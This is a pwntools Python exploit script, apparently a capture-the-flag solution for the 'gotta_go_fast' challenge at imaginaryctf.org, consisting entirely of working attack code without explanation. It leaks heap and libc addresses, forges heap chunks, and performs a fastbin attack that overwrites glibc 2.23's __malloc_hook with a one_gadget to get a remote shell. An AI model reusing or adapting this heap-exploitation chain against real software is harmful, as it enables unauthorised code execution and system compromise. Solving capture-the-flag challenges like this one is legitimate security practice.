#!/usr/bin/python3

from pwn import *

exe = ELF("./gotta_go_fast_patched")
libc = ELF("./libc6_2.23-0ubuntu11.2_amd64.so")

def conn():
    r = process([exe.path])
    return r


#r = conn()
r = remote("chal.imaginaryctf.org", 42009)

def s(data):
    r.sendlineafter("> ", data)

def alloc(name):
    s("0")
    s("1")
    s("1")
    r.recvline()
    r.sendline(name)

def free(index):
    s("1")
    s(str(index))

def leak(mem):
    s("4")
    r.recvline()
    r.sendline(str(mem))
    return int(r.recvline().strip(), 16)

def show():
    s("2")

def main():
    
    
    HEAD = leak(0x602050)
    log.warn("Heap leak (Head) @ 0x%x", HEAD)
    HEAP_BASE = HEAD - 0x2a0

    alloc(p64(0) + p64(0x421) + p8(0)*0x10 + p64(HEAP_BASE + 0x5f0))
    
    for i in range((0x410//0x70) + 1):
        alloc((p64(0) + p64(0x21))*(0x6))
    
    free(0x360//8)
    
    alloc(p64(HEAP_BASE + 0x650) + p8(0)*0x50 + p64(0x421))
    alloc(b"M"*8)
    pause()

    free(0x350//8)
    
    for i in range(7):
        alloc(p64(HEAD+0x340)*6)

    alloc(b"LIBCLEAK")
    show()
    
    r.recvuntil("Tribute 2 [")
    LIBC_LEAK = u64(r.recv(6)+p16(0))
    log.warn("Libc leak @ 0x%x", LIBC_LEAK)

    LIBC_BASE = LIBC_LEAK - libc.sym["main_arena"] - 88

    log.warn("Libc base @ 0x%x", LIBC_BASE)
    
    libc.address = LIBC_BASE

    free(136)
    free(3)
    free(0)

    alloc(p64(libc.sym['__malloc_hook'] - 0x23))
    alloc(b"MAHER")
    alloc(b"MAHER")
    alloc(b"M"*(0x13-0x8) + p64(0) + p64(libc.address + 0xf0364))
    r.recv()
    r.sendline("0")
    r.interactive()


if __name__ == "__main__":
    main()
